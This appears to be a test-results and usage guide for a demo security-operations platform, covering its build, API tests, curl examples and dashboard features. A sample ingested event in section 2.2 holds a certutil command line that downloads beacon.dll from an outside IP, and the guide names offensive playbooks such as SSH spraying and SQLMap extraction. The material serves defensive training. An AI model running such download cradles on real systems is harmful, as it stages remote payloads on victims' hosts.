# TEST.md — Verification Test Suite, Sample Run & Platform Usage Guide

> **Platform:** Sh4d0w_Br0k3rs — Cyber Arena  
> **Test Execution Date:** 2026-11-18  
> **Runtime Verified:** Node.js v22, npm, Vite v6.4.6, React 18.3.1

This document provides:
1. **Verified Automated Test Results** (Frontend Production Build, Live Backend REST API Integration Suite, and Frontend Dual-Mode Offline Engine Suite).
2. **Real Sample Run Logs & HTTP Payloads** captured from actual execution.
3. **Step-by-Step Platform Usage Guide** explaining how to launch and operate every feature in the UI and API.

---

## 1. Automated Test Execution Summary

| Test Suite | Checks Run | Passed | Failed | Execution Time |
|---|:---:|:---:|:---:|:---:|
| **Suite A: Frontend Production Build (`vite build`)** | 1 | **1** | 0 | 4.64 s |
| **Suite B: Live Backend Unified REST API (`backend-php/server.js`)** | 14 | **14** | 0 | ~20 ms |
| **Suite C: Frontend Dual-Mode Offline Engine (`src/services/api.js`)** | 7 | **7** | 0 | ~5 ms |
| **Suite D: Vite Dev Server Startup (`npm run dev` on `:3000`)** | 1 | **1** | 0 | 1.32 s |
| **TOTAL** | **23** | **23** | **0** | **100% PASS** |

---

## 2. Detailed Test Results

### Suite A: Frontend Production Build Verification

Command executed:
```bash
npm --prefix frontend-react run build
```

Observed output:
```text
> threat-hunter-frontend@1.0.0 build
> vite build

vite v6.4.6 building for production...
transforming...
✓ 2118 modules transformed.
rendering chunks...
computing gzip size...
dist/index.html                   1.18 kB │ gzip:   0.67 kB
dist/assets/index-B1-xrTXY.css   67.46 kB │ gzip:  11.14 kB
dist/assets/index-CO-s1qwk.js   462.04 kB │ gzip: 123.94 kB
✓ built in 4.64s
```
- **Result:** `PASS` — All 21 React components, constants, Tailwind stylesheets, and services bundle cleanly with zero syntax or import errors.

---

### Suite B: Live Backend REST API Integration Tests (`backend-php/server.js`)

All 14 live HTTP requests were executed against `backend-php/server.js`:

| # | Method & Endpoint | Verification Assertion | HTTP Status | Latency | Result |
|---:|---|---|:---:|:---:|:---:|
| 1 | `GET /api` | Returns `status: "operational"`, platform v3.0.0, 5 core capabilities | `200` | 1 ms | **PASS** |
| 2 | `GET /api/scenarios` | Returns all 8 synthetic & red-team attack scenarios | `200` | 1 ms | **PASS** |
| 3 | `GET /api/events?scenario_id=SCN-APT29-GHOST` | Returns all 10 normalized multi-domain APT29 events (`EVT-APT-001`..`010`) | `200` | 1 ms | **PASS** |
| 4 | `GET /api/events?scenario_id=SCN-APT29-GHOST&domain=cloud&severity=critical` | Accurately filters down to `EVT-APT-009` (`S3::GetObject`) | `200` | 3 ms | **PASS** |
| 5 | `POST /api/events` | Ingests live Certutil Download Cradle (`T1105`), generates `EVT-ING-*` UUID, logs to audit ledger | `201` | 2 ms | **PASS** |
| 6 | `GET /api/correlate?scenario_id=SCN-APT29-GHOST` | Re-correlates 11 events (10 seed + 1 ingested) with `confidence_score: 0.94` | `200` | 1 ms | **PASS** |
| 7 | `GET /api/attack_path?scenario_id=SCN-APT29-GHOST` | Builds directed graph with updated nodes, 11 edges, and blast radius | `200` | 2 ms | **PASS** |
| 8 | `GET /api/mitre?scenario_id=SCN-APT29-GHOST` | Maps 11 active techniques including newly ingested `T1105` | `200` | 1 ms | **PASS** |
| 9 | `GET /api/ai_assist?scenario_id=SCN-APT29-GHOST` | Returns evidence-cited summary (`[EVT-APT-001]`..`[EVT-APT-010]`) & 4 containment actions | `200` | 1 ms | **PASS** |
| 10 | `GET /api/report?scenario_id=SCN-APT29-GHOST&analyst=Noor%20Hassan` | Generates forensic incident report with lead analyst & 11-item custody chain | `200` | 1 ms | **PASS** |
| 11 | `GET` & `POST /api/detections` | Lists 4 seed Sigma/KQL rules and deploys a new `T1105` Sigma rule (`RULE-*`) | `200`/`201` | 2 ms | **PASS** |
| 12 | `GET` & `POST /api/gating` | Lists 3 HITL containment items and transitions `ACT-GATE-001` to `approved_and_executed` | `200` | 1 ms | **PASS** |
| 13 | `GET /api/audit` | Confirms append-only SHA-256 ledger grew from 3 to 6 entries (`INGEST_SECURITY_EVENT`, `CREATE_DETECTION_RULE`, `HITL_ACTION_APPROVED`) | `200` | 1 ms | **PASS** |
| 14 | `GET /api/unknown-route` | Returns structured JSON error payload | `404` | 1 ms | **PASS** |

> **Minor Non-Blocking Observation:** On Node.js v22, `backend-php/server.js` emits a deprecation notice `[DEP0169] url.parse()` in stderr. All endpoints function normally; migrating to `new URL(req.url, ...)` is an optional future cleanup.

---

### Suite C: Frontend Dual-Mode Offline Engine Tests (`frontend-react/src/services/api.js`)

Executed with `api.useLiveBackend = false` (simulating instant browser mode with zero backend running):

| # | Test Case | Verified Output | Latency | Result |
|---:|---|---|:---:|:---:|
| 1 | `api.getScenarios()` | Loaded all 3 built-in scenarios (`SCN-APT29-GHOST`, `SCN-RANSOM-BLACKCAT`, `SCN-CLOUD-CRYPTOMINE`) | 0 ms | **PASS** |
| 2 | Full Pipeline — `SCN-APT29-GHOST` | 10 events, 9 graph nodes, 10 edges, 8 MITRE tactics, 10 techniques, 10 AI citations, confidence `0.98` | 3 ms | **PASS** |
| 3 | Full Pipeline — `SCN-RANSOM-BLACKCAT` | 7 events, 5 graph nodes, 7 edges, 6 MITRE tactics, 7 techniques, 5 AI citations, confidence `0.98` | 1 ms | **PASS** |
| 4 | Full Pipeline — `SCN-CLOUD-CRYPTOMINE` | 5 events, 6 graph nodes, 5 edges, 4 MITRE tactics, 4 techniques, 5 AI citations, confidence `0.87` | 0 ms | **PASS** |
| 5 | `api.askAiCustomQuery()` Evidence Grounding | Lateral ➔ `['EVT-APT-006','EVT-RSM-002']`; Cloud ➔ `['EVT-APT-008','EVT-APT-009','EVT-CLD-002']`; Credential ➔ `['EVT-APT-004','EVT-APT-005','EVT-APT-007']` | 0 ms | **PASS** |
| 6 | `api.ingestEvent()` Local Injection | Injected `T1071.004` DNS Tunneling (`EVT-ING-IEUKLI`), events rose `10 ➔ 11`, graph edges rose `10 ➔ 11` | 0 ms | **PASS** |
| 7 | `getAiQuerySuggestions()` & `getAiLimitations()` | Returned 5 SPL/SQL hunt templates and 5 formal AI risk & HITL governance items | 1 ms | **PASS** |

---

## 3. Complete Sample Run (End-to-End Walkthrough)

### Step 1: Launch the Platform

#### Quickest Launch (Frontend + Node.js Unified API)
Open **two terminals** at the repository root:

```bash
# Terminal 1 — Start the Unified REST API Server (Port 8000)
cd backend-php
node server.js
# Expected output:
# [✓] Sh4d0w_Br0k3rs Unified API Server running on http://0.0.0.0:8000
```

```bash
# Terminal 2 — Start the React SOC Dashboard (Port 3000)
cd frontend-react
npm install
npm run dev
# Expected output:
# VITE v6.4.6  ready in 1318 ms
# ➜  Local:   http://localhost:3000/
```

*(Note: Even if you skip Terminal 1, the dashboard at `http://localhost:3000` still runs 100% interactively using its embedded offline correlation engine!)*

---

### Step 2: Sample API Run (cURL / PowerShell)

#### 2.1 Check Platform Health
```bash
curl http://localhost:8000/api
```
Sample response:
```json
{
  "platform": "Sh4d0w_Br0k3rs Evidence-Driven Platform API",
  "status": "operational",
  "version": "3.0.0",
  "features": [
    "Relational Evidence Graph",
    "Detection Engineering Studio (Sigma / SPL / KQL)",
    "Human-in-the-Loop (HITL) Action Gating",
    "Append-Only Audit Ledger (audit_events)",
    "Role-Based Access Control (L1 Triage, L2 Hunter, L3 Commander)"
  ]
}
```

#### 2.2 Ingest a Live Attack Event (`POST /api/events`)
```bash
curl -X POST http://localhost:8000/api/events \
  -H "Content-Type: application/json" \
  -d '{
    "scenario_id": "SCN-APT29-GHOST",
    "domain": "endpoint",
    "event_type": "process_creation",
    "severity": "high",
    "source_host": "WKSTN-DEV-12",
    "dest_host": "WKSTN-DEV-12",
    "source_ip": "10.0.1.75",
    "dest_ip": "185.220.101.5",
    "user_id": "alex.chen",
    "process_name": "certutil.exe",
    "command_line": "certutil.exe -urlcache -split -f http://185.220.101.5/beacon.dll C:\\Windows\\Temp\\beacon.dll",
    "mitre_tactic": "Command and Control",
    "mitre_technique_id": "T1105",
    "mitre_technique_name": "Ingress Tool Transfer"
  }'
```
Sample response (`201 Created`):
```json
{
  "status": "success",
  "message": "Event indexed in telemetry datastore",
  "event": {
    "id": 11,
    "event_uuid": "EVT-ING-7K2M9Q",
    "scenario_id": "SCN-APT29-GHOST",
    "domain": "endpoint",
    "severity": "high",
    "mitre_technique_id": "T1105",
    "mitre_technique_name": "Ingress Tool Transfer"
  }
}
```

#### 2.3 Run Cross-Domain Correlation (`GET /api/correlate`)
```bash
curl "http://localhost:8000/api/correlate?scenario_id=SCN-APT29-GHOST"
```
Sample response:
```json
{
  "status": "success",
  "scenario_id": "SCN-APT29-GHOST",
  "total_events_analyzed": 11,
  "incident_title": "Correlated Relational Evidence Graph: 11 events across 4 domains",
  "confidence_score": 0.94,
  "kill_chain_coverage": [
    "Initial Access", "Execution", "Command and Control",
    "Credential Access", "Lateral Movement", "Privilege Escalation",
    "Collection", "Exfiltration"
  ],
  "entities_involved": {
    "users": ["sarah.connor", "svc_sqladmin", "ProductionDataOpsRole", "alex.chen"],
    "hosts": ["WKSTN-FIN-04", "c2-telemetry-sync.net", "DC01.corp.local", "AWS Cloud (us-east-1)", "AWS S3 (us-east-1)", "AWS-Egress-Gateway", "WKSTN-DEV-12"]
  }
}
```

#### 2.4 Approve a Human-in-the-Loop Containment Action (`POST /api/gating`)
```bash
curl -X POST http://localhost:8000/api/gating \
  -H "Content-Type: application/json" \
  -d '{
    "action_id": "ACT-GATE-001",
    "decision": "approve",
    "analyst_name": "Noor Hassan (L2 Hunter)",
    "reason": "Confirmed LSASS memory dump EVT-APT-004 on WKSTN-FIN-04"
  }'
```
Then verify the cryptographic audit trail:
```bash
curl http://localhost:8000/api/audit
```
Returns the append-only ledger containing `HITL_ACTION_APPROVED`, `CREATE_DETECTION_RULE`, and `INGEST_SECURITY_EVENT` with SHA-256 signatures.

---

## 4. Platform User Guide (How to Use Every Feature in the UI)

Open **`http://localhost:3000`** in your browser and follow this SOC investigation workflow:

### 1. Header & Global Controls
- **Switch Theme:** Click **White Theme / Dark Theme** in the top status bar to switch between the pristine light theme and obsidian dark theme.
- **Select Attack Scenario:** Use the **Scenario** dropdown in the top header to switch between:
  - *Operation GhostToken (APT29 Hybrid Enterprise)*
  - *Double-Extortion Ransomware Campaign (BlackCat)*
  - *Cloud-Native IAM Hijack & Cryptomining*
  - *(Plus 5 additional red-team scenarios when `backend-php/server.js` is running)*
- **Global IOC Search:** Type any IP (`185.220.101.5`), user (`sarah.connor`), host (`DC01`), or MITRE ID (`T1003.001`) to filter telemetry in real time.
- **Reset Statistics to Zero:** Click **Reset to 0** in the header (or inside the General Statistics card) to zero out all counters and pause live telemetry for clean baseline demonstrations; click **Restore Stats** to reload live figures.

### 2. Overview & Globe Tab (`Overview & Globe`)
- Inspect top KPI cards (**Correlated Events**, **Critical Alerts**, **High Severity**, **Kill Chain Coverage**).
- Review the 4-domain telemetry distribution (**Endpoint**, **Network Flows**, **Cloud Infrastructure**, **Active Directory Auth**).
- Watch the rotating **3D Global Threat Origin Map** linking Attack Origins (pink), Pivot Nodes (cyan), and Exfiltration Targets (emerald).
- Click any row in the **Live Correlated Event Stream** at the bottom to open the **Evidence Drawer**.

### 3. Attack Path Visualizer Tab (`Attack Path Visualizer`)
- Switch between **Cisco Packet Tracer** (default), **Linear Kill-Chain**, and **Topology Graph** modes.
- Press **Play** to animate packet flow and kill-chain traversal step by step from initial ingress (`WKSTN-FIN-04`) to Domain Controller (`DC01.corp.local`) and cloud exfiltration (`AWS S3`).
- Click any edge or packet badge to inspect the raw event in the **Evidence Drawer**.
- Use the embedded **Terminal Console** below the graph to run investigative or containment commands.

### 4. CIM Telemetry Tab (`CIM Telemetry`)
- Explore normalized events in a Kibana Discover-style table.
- Filter by domain (`endpoint`, `auth`, `network`, `cloud`) or severity (`critical`, `high`, `medium`, `low`) and inspect structured JSON fields.

### 5. MITRE Matrix Tab (`MITRE Matrix`)
- Inspect the 12-tactic MITRE ATT&CK heatmap. Highlighted cells show observed techniques and hit counts.
- Click any highlighted technique tile (e.g., `T1003.001 LSASS Memory Dumping` or `T1530 Data from Cloud Storage`) to jump straight into its raw evidence event.

### 6. Attack Sequences Tab (`Attack Sequences`)
- Launch the interactive **Offensive Kali Terminal**.
- Choose a pre-built attack playbook from the arsenal (e.g., **Nmap SYN Stealth Scan**, **Hydra Low-and-Slow SSH Spray**, **Distributed Credential Stuffing**, **SQLMap Extraction**, **Ghost Transaction Replay**) or type commands directly.
- Every executed attack automatically injects live telemetry into the defensive correlation engine—switch back to **Attack Path Visualizer** or **MITRE Matrix** to see the new threat appear immediately!

### 7. AI Copilot Tab (`AI Copilot`)
- Read the **Executive Threat Summary** generated for the active scenario.
- Click any **`[EVT-...]`** citation badge inside the summary to verify the claim directly against raw telemetry in the **Evidence Drawer**.
- Copy ready-to-run **SPL** (Splunk) or **SQL** hunting queries from the Query Suggestions list.
- Ask custom questions in the Copilot prompt (e.g., *"How did lateral movement occur via WMI?"* or *"Explain the AWS S3 exfiltration"*) and verify every returned evidence link.
- Click **AI Limitations** to review the platform's hallucination, base-rate fallacy, and HITL governance controls.

### 8. Detection Studio Tab (`Detection Studio`)
- Browse active **Sigma**, **SPL**, and **KQL** rules mapped to MITRE techniques.
- Create and deploy a new detection rule using built-in templates; when connected to `server.js`, new rules persist and are recorded in the Audit Ledger.

### 9. Live Ingestion & Forensic Reports (`Ingest Telemetry` & `Investigation Reports`)
- Click **Ingest Telemetry** (flame icon / header button) to inject a custom or preset attack event (Certutil, VPN Spray, DNS Tunneling, CloudTrail Tampering) and re-correlate live.
- Open the **Investigation Reports** tab to inspect the SHA-256 signed **Audit Ledger** and click **Export Full Incident Report** to preview and download a complete forensic report as **Markdown (`.md`)** or **Printable PDF**.

---

## 5. Alternative Deployment Modes

| Mode | Command | Endpoints |
|---|---|---|
| **Docker Compose (Full 3-Tier)** | `docker compose up -d --build` (or `.\deploy-docker.ps1`) | UI: `:3000`, PHP API: `:8000`, MySQL: `:3306` |
| **Kubernetes (Kustomize)** | `kubectl apply -k ./k8s` (or `.\deploy-k8s.ps1`) | Ingress: `http://aegishunt.local` (`/` & `/api`) |
| **Standalone PHP + MySQL** | `cd backend-php && php seed.php && php -S localhost:8000 router.php` | PHP API: `:8000` |
| **ThreatLens ML Arsenal** | `cd hackathone-arsenal/app/backend && uvicorn server:app --port 8000` + `cd hackathone-arsenal/app/frontend && npm run dev` | FastAPI + WS: `:8000`, Obsidian UI: `:3000` |
